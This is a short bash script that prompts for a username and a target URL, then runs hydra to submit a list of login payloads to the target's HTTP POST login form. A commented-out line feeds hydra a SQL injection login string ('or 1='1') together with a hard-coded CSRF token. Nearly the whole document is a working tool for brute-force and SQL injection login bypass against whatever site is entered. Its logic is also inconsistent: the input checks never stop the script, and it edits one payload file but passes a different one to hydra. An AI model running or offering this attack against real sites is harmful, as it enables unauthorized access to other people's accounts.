 #! /usr/bin/bash
echo "Enter a UserName"
read user
if ! [ $user ]; then
        echo "Failed to enter and email address"
fi
echo "Enter URL of target"
read URL
if ! [ $URL ]; then
        echo "Failed to enter info"
fi

sed -i "s/user/"$user"/g" SQLv.txt

hydra -L "SQLvuln2.txt" -p "1" http-post:"$URL"





#hydra -l "Nick' or 1='1" -p "1" http-post-form:"$URL:username=^USER^&password=^PASS^&login:csrfmiddlewaretoken=oK3iHkVswIJxx2Y7RDUaoCnbr8PG2JrpqicpsI9uVN6EfgegHsIgZxjZNtYIkIfS"
